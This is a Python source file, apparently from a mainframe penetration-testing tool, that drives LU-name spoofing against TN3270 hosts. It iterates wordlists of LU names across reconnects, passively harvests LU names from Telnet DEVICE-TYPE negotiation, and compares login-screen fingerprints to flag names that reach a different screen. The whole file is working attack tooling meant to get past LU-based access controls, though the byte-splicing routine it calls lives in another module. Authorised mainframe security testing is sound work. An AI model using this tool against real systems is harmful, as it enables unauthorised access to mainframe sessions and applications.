"""
LU-name spoofing campaign driver.

The actual byte-surgery (_splice_lu_name) lives in tn3270_v2.py and is
called by TN3270.negotiate_hook(). This module is the CAMPAIGN: wordlist
iteration, harvest mode, result tracking, screen-fingerprint comparison.

Spec: docs/superpowers/specs/2026-04-07-hackterm-design.md §3.2
RFC 2355 §4 — TN3270E DEVICE-TYPE negotiation

Wire format being attacked:
  Client: IAC SB TN3270E DEVICE-TYPE REQUEST <type> CONNECT <lu> IAC SE
          ff  fa  28      02          07     ...    01      ...  ff f0
  Server: IAC SB TN3270E DEVICE-TYPE IS <type> CONNECT <lu> IAC SE
          ff  fa  28      02          04 ...    01      ...  ff f0
                                      ^^ note: 0x04, not 0x07
"""
import hashlib
from typing import Optional, Literal

from hackterm_core.protocol import Protocol, Screen


Mode = Literal["single", "wordlist", "harvest"]

# Telnet sub-negotiation prefixes — both directions
_DEVTYPE_REQ = bytes([0xFF, 0xFA, 0x28, 0x02, 0x07])   # client → server
_DEVTYPE_IS  = bytes([0xFF, 0xFA, 0x28, 0x02, 0x04])   # server → client
_CONNECT = 0x01
_IAC_SE = bytes([0xFF, 0xF0])


class LUSpoofer:
    """LU-name spoofing campaign driver.

    Modes:
      single   — operator sets one LU name, used for next reconnect
      wordlist — iterate injections/lu-names.txt, one per reconnect
      harvest  — passively collect LU names seen on the wire

    The splice itself happens in TN3270.negotiate_hook() which checks
    daemon.negotiate_opts.spoof_device_name. This class only drives
    that state machine; it never touches bytes directly except for
    passive harvesting.

    Wordlist mode reconnect cycle (driven by GUI/MCP, not here):
      1. daemon.close() → emulator drops
      2. spoofer.next_lu() → sets negotiate_opts.spoof_device_name
      3. daemon.wait_for_client() → emulator auto-reconnects
      4. After handshake, compare first screen against fingerprint
      5. Match → log fail, goto 1. Mismatch → STOP, alert operator.
    """

    def __init__(self, protocol: Optional[Protocol] = None):
        self.protocol = protocol
        self.mode: Mode = "single"
        self.target_lu: Optional[str] = None
        self.wordlist: list[str] = []
        self._wordlist_idx = 0
        self.harvested: set[str] = set()
        self.login_screen_fingerprint: Optional[bytes] = None
        self.results: list[tuple[str, str]] = []
        self._daemon = None

    def attach(self, daemon) -> None:
        """Hook into the proxy daemon as an observer."""
        self._daemon = daemon
        daemon.add_observer(self._observe)

    # --- Single mode ----------------------------------------------------

    def set_target(self, lu_name: str) -> None:
        """Single-shot: set the LU name for the next handshake.

        Writes daemon.negotiate_opts.spoof_device_name — the protocol's
        negotiate_hook reads this and splices it into DEVICE-TYPE REQUEST.
        """
        self.target_lu = lu_name
        if self._daemon:
            self._daemon.negotiate_opts.spoof_device_name = lu_name

    # --- Wordlist mode --------------------------------------------------

    def load_wordlist(self, path: str) -> None:
        """Load LU names from a file. One per line, # = comment."""
        names = []
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    names.append(line)
        self.wordlist = names
        self._wordlist_idx = 0

    def next_lu(self) -> Optional[str]:
        """Advance to the next wordlist entry and arm the daemon.

        Returns None when the wordlist is exhausted.
        """
        if self._wordlist_idx >= len(self.wordlist):
            return None
        lu = self.wordlist[self._wordlist_idx]
        self._wordlist_idx += 1
        self.set_target(lu)
        return lu

    # --- Harvest --------------------------------------------------------

    def _observe(self, data: bytes, direction: str) -> None:
        """Passively harvest LU names from negotiation traffic.

        c2s: client's DEVICE-TYPE REQUEST — what the emulator asks for
        s2c: server's DEVICE-TYPE IS    — what the host actually assigns
        """
        if direction == "c2s":
            self._harvest(data, _DEVTYPE_REQ)
        elif direction == "s2c":
            self._harvest(data, _DEVTYPE_IS)

    def _harvest(self, data: bytes, prefix: bytes) -> None:
        idx = data.find(prefix)
        if idx < 0:
            return
        end = data.find(_IAC_SE, idx)
        if end < 0:
            return
        body = data[idx + len(prefix):end]
        connect_pos = body.find(bytes([_CONNECT]))
        if connect_pos < 0:
            return  # no CONNECT clause → no LU name
        lu = body[connect_pos + 1:].decode("ascii", errors="replace")
        if lu:
            self.harvested.add(lu)

    # --- Screen fingerprinting ------------------------------------------

    def set_fingerprint(self, screen: Screen) -> None:
        """Record this screen's text-hash as the login-screen baseline.

        Hash the rendered text (not raw bytes) so timestamps embedded
        in the datastream don't cause false negatives.
        """
        self.login_screen_fingerprint = self._hash(screen)

    def screen_matches_fingerprint(self, screen: Screen) -> bool:
        """Does this screen match the recorded baseline?

        True  → spoofed LU landed on the same login screen (uninteresting)
        False → spoofed LU went somewhere DIFFERENT (operator should look)
        """
        if self.login_screen_fingerprint is None:
            return False
        return self._hash(screen) == self.login_screen_fingerprint

    @staticmethod
    def _hash(screen: Screen) -> bytes:
        return hashlib.sha256(screen.text.encode()).digest()

    # --- Results --------------------------------------------------------

    def record_result(self, lu_name: str, screen_summary: str) -> None:
        """Append to results table for GUI display / MCP query."""
        self.results.append((lu_name, screen_summary))
